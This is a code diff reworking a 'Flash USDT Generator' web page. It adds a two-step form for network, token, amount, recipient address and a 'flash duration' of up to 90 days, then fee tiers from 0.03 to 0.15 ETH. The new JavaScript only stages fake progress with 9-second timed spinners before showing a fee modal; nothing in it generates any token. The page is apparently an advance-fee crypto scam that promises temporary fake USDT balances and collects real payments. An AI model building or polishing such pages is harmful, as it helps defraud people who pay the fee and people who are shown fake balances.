@@ -888,6 +888,87 @@
             box-shadow: 0 5px 20px rgba(0, 255, 65, 0.3);
         }
 
+        /* Amount Selection Buttons */
+        .amount-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .amount-select-btn {
+            padding: 18px 15px;
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid rgba(0, 255, 65, 0.3);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .amount-select-btn:hover {
+            background: rgba(0, 255, 65, 0.1);
+            border-color: var(--neon-green);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.4);
+        }
+
+        .amount-select-btn.selected {
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.2), rgba(0, 255, 255, 0.2));
+            border: 2px solid var(--neon-green);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
+        }
+
+        .amount-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--neon-green);
+        }
+
+        .amount-fee {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            color: var(--neon-cyan);
+            font-weight: 500;
+        }
+
+        /* Fee Display Block */
+        .fee-display {
+            margin-top: 20px;
+            padding: 15px 20px;
+            background: rgba(0, 255, 65, 0.1);
+            border: 2px solid var(--neon-green);
+            border-radius: 12px;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .fee-label {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 8px;
+        }
+
+        .fee-amount {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--neon-green);
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         .commission-info {
             background: rgba(0, 255, 255, 0.05);
             border: 1px solid rgba(0, 255, 255, 0.3);
@@ -1600,11 +1681,12 @@
         <div class="main-card">
             <h2 class="section-title" data-translate="generator_title">⚡ Flash USDT Generator</h2>
             
-            <form id="generatorForm">
+            <!-- Step 1: Network & Token Selection -->
+            <form id="step1Form">
                 <div class="form-group">
                     <label class="form-label" for="network" data-translate="select_network">Select Network</label>
-                    <select id="network" onchange="updateCommission()">
-                        <option value="">-- Select Network First --</option>
+                    <select id="network" required>
+                        <option value="">-- Select Network --</option>
                         <option value="ethereum">Ethereum (ERC-20)</option>
                         <option value="bsc">Binance Smart Chain (BEP-20)</option>
                         <option value="polygon">Polygon (MATIC)</option>
@@ -1614,25 +1696,48 @@
                     </select>
                 </div>
 
-            <div class="amount-section">
-                <div class="amount-label" data-translate="enter_amount">Enter Flash USDT Amount</div>
-                <div class="amount-input-wrapper">
-                    <input type="number" class="amount-input" id="amountInput" 
-                           placeholder="0" step="1" min="1" value="10000">
-                    <div class="currency-badge">USDT</div>
+                <div class="form-group">
+                    <label class="form-label" for="tokenInput">
+                        <span data-translate="select_token">Select Token</span> <span class="required">*</span>
+                    </label>
+                    <input type="text" id="tokenInput" placeholder="Enter token (USDT only)" required style="text-transform: uppercase;">
+                    <div id="tokenError" style="color: var(--neon-pink); font-size: 0.9rem; margin-top: 8px; display: none;">
+                        ⚠️ Only USDT token is supported
+                    </div>
                 </div>
-                <div class="quick-amounts">
-                    <button class="quick-btn" onclick="setAmount(10000)">10,000 USDT</button>
-                    <button class="quick-btn" onclick="setAmount(20000)">20,000 USDT</button>
-                    <button class="quick-btn" onclick="setAmount(50000)">50,000 USDT</button>
-                    <button class="quick-btn" onclick="setAmount(100000)">100,000 USDT</button>
-                </div>
-                <div class="commission-info" id="commissionInfo" style="display: none;">
-                    <div class="commission-text" data-translate="processing_fee">Processing Fee:</div>
-                    <div class="commission-amount" id="commissionAmount">-- Select Network --</div>
-                </div>
-            </div>
 
+                <div class="form-group">
+                    <label class="form-label" data-translate="select_amount">Select Flash Amount</label>
+                    <div class="amount-buttons">
+                        <button type="button" class="amount-select-btn" data-amount="20000" onclick="selectAmount(20000)">
+                            <div class="amount-value">20,000</div>
+                        </button>
+                        <button type="button" class="amount-select-btn" data-amount="50000" onclick="selectAmount(50000)">
+                            <div class="amount-value">50,000</div>
+                        </button>
+                        <button type="button" class="amount-select-btn" data-amount="100000" onclick="selectAmount(100000)">
+                            <div class="amount-value">100,000</div>
+                        </button>
+                        <button type="button" class="amount-select-btn" data-amount="250000" onclick="selectAmount(250000)">
+                            <div class="amount-value">250,000</div>
+                        </button>
+                    </div>
+                    <input type="hidden" id="selectedAmount" value="">
+                    
+                    <!-- Fee Display (appears after selection) -->
+                    <div class="fee-display" id="feeDisplay" style="display: none;">
+                        <div class="fee-label" data-translate="processing_fee">Processing Fee:</div>
+                        <div class="fee-amount" id="feeAmount">0.03 ETH</div>
+                    </div>
+                </div>
+
+                <button type="submit" class="generate-btn">
+                    <span data-translate="continue_btn">CONTINUE</span>
+                </button>
+            </form>
+
+            <!-- Step 2: Recipient & Duration (hidden initially) -->
+            <form id="step2Form" style="display: none;">
                 <div class="form-group">
                     <label class="form-label" for="recipientAddress">
                         <span data-translate="recipient_address">Recipient Address</span> <span class="required">*</span>
@@ -1642,26 +1747,26 @@
 
                 <div class="form-group">
                     <label class="form-label" for="duration" data-translate="flash_duration">Flash Duration</label>
-                    <select id="duration">
-                        <option value="30">30 minutes</option>
-                        <option value="60">1 hour</option>
-                        <option value="120">2 hours</option>
-                        <option value="360">6 hours</option>
-                        <option value="720">12 hours</option>
-                        <option value="1440">24 hours</option>
+                    <select id="duration" required>
+                        <option value="10080">1 Week (7 days)</option>
+                        <option value="43200">1 Month (30 days)</option>
+                        <option value="86400">2 Months (60 days)</option>
+                        <option value="129600">90 Days</option>
                     </select>
                 </div>
 
-                <button type="submit" class="generate-btn" id="generateBtn">
+                <button type="submit" class="generate-btn">
                     <span data-translate="generate_btn">⚡ GENERATE FLASH USDT</span>
                 </button>
             </form>
 
+            <!-- Loading -->
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <div class="loading-text" data-translate="generating">Generating transaction...</div>
+                <div class="loading-text" data-translate="generating">Processing...</div>
             </div>
 
+            <!-- Result Section -->
             <div class="result-section" id="resultSection">
                 <div class="success-icon">✓</div>
                 <div class="success-title" data-translate="success_title">Flash USDT Successfully Generated!</div>
@@ -2027,10 +2132,109 @@
         let currentLang = 'en';
         let isWalletConnected = false;
         let userAddress = '';
-        let currentAmount = 10000;
+        let currentAmount = 0;
         let currentNetwork = '';
-        let currentDuration = '30';
+        let currentDuration = '';
         let currentRecipient = '';
+        let selectedAmountValue = 0;
+
+        // Update token input validation
+        document.getElementById('tokenInput').addEventListener('input', function() {
+            const value = this.value.toUpperCase();
+            this.value = value;
+            
+            const error = document.getElementById('tokenError');
+            if (value && value !== 'USDT') {
+                error.style.display = 'block';
+            } else {
+                error.style.display = 'none';
+            }
+        });
+
+        function selectAmount(amount) {
+            selectedAmountValue = amount;
+            document.getElementById('selectedAmount').value = amount;
+            
+            // Update button styles
+            document.querySelectorAll('.amount-select-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            document.querySelector(`[data-amount="${amount}"]`).classList.add('selected');
+            
+            // Show fee
+            const network = document.getElementById('network').value;
+            if (network) {
+                const ethFee = calculateCommission(amount);
+                const currency = networkCurrency[network];
+                const nativeFee = convertToNative(ethFee, network);
+                
+                document.getElementById('feeAmount').textContent = nativeFee + ' ' + currency.symbol;
+                document.getElementById('feeDisplay').style.display = 'block';
+            }
+        }
+
+        // Step 1 Form Submit
+        document.getElementById('step1Form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const network = document.getElementById('network').value;
+            const token = document.getElementById('tokenInput').value.toUpperCase();
+            const amount = selectedAmountValue;
+            
+            if (!network) {
+                alert('Please select a network');
+                return;
+            }
+            
+            if (token !== 'USDT') {
+                alert('Only USDT token is supported');
+                return;
+            }
+            
+            if (!amount) {
+                alert('Please select an amount');
+                return;
+            }
+            
+            currentNetwork = network;
+            currentAmount = amount;
+            
+            // Hide step 1, show loading
+            document.getElementById('step1Form').style.display = 'none';
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('loading').querySelector('.loading-text').textContent = 'Processing...';
+            
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                document.getElementById('step2Form').style.display = 'block';
+            }, 9000);
+        });
+
+        // Step 2 Form Submit
+        document.getElementById('step2Form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const recipient = document.getElementById('recipientAddress').value;
+            const duration = document.getElementById('duration').value;
+            
+            if (!recipient || recipient.trim() === '') {
+                alert('Please enter recipient address');
+                return;
+            }
+            
+            currentRecipient = recipient;
+            currentDuration = duration;
+            
+            // Hide step 2, show loading
+            document.getElementById('step2Form').style.display = 'none';
+            document.getElementById('loading').classList.add('active');
+            document.getElementById('loading').querySelector('.loading-text').textContent = 'Generating transaction...';
+            
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                showFeeModal();
+            }, 9000);
+        });
 
         function changeLanguage(lang) {
             currentLang = lang;
@@ -2115,16 +2319,22 @@
         }
 
         function calculateCommission(amount) {
-            if (amount >= 100000) return 200;
-            if (amount >= 50000) return 120;
-            if (amount >= 20000) return 80;
-            if (amount >= 10000) return 50;
-            return 50;
+            if (amount >= 250000) return 0.15; // 250k = 0.15 ETH
+            if (amount >= 100000) return 0.08; // 100k = 0.08 ETH
+            if (amount >= 50000) return 0.05;  // 50k = 0.05 ETH
+            if (amount >= 20000) return 0.03;  // 20k = 0.03 ETH (minimum)
+            return 0.03; // Default minimum
         }
 
-        function convertToNative(usdtAmount, network) {
+        function convertToNative(ethAmount, network) {
             const currency = networkCurrency[network];
-            const nativeAmount = usdtAmount / currency.price;
+            if (!currency) return '0';
+            
+            // Конвертируем ETH в нативную валюту сети
+            const ethPrice = cryptoPrices.ETH;
+            const usdtEquivalent = ethAmount * ethPrice; // Сколько это в USDT
+            const nativeAmount = usdtEquivalent / currency.price; // Конвертируем в нативную валюту
+            
             return nativeAmount.toFixed(6);
         }
 
@@ -2199,43 +2409,6 @@
             document.getElementById('connectBtn').innerHTML = translations[currentLang]['connect_wallet'];
             document.getElementById('disconnectBtn').style.display = 'none';
         }
-
-        document.getElementById('generatorForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const amount = parseFloat(document.getElementById('amountInput').value);
-            const recipient = document.getElementById('recipientAddress').value;
-            const network = document.getElementById('network').value;
-            const duration = document.getElementById('duration').value;
-
-            if (!network || network === '') {
-                alert('Please select a network first');
-                return;
-            }
-
-            if (!amount || amount <= 0) {
-                alert('Please enter a valid amount');
-                return;
-            }
-
-            if (!recipient || recipient.trim() === '') {
-                alert('Please specify recipient address');
-                return;
-            }
-
-            currentAmount = amount;
-            currentNetwork = network;
-            currentDuration = duration;
-            currentRecipient = recipient;
-
-            document.getElementById('loading').classList.add('active');
-            document.getElementById('resultSection').classList.remove('active');
-
-            setTimeout(() => {
-                document.getElementById('loading').classList.remove('active');
-                showFeeModal();
-            }, 9000);
-        });
 
         function showFeeModal() {
             const commission = calculateCommission(currentAmount);
@@ -2322,7 +2495,7 @@
             document.getElementById('resultSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
 
-        updateCommission();
+        // Initialize
         changeLanguage('en');
     </script>
 </body>
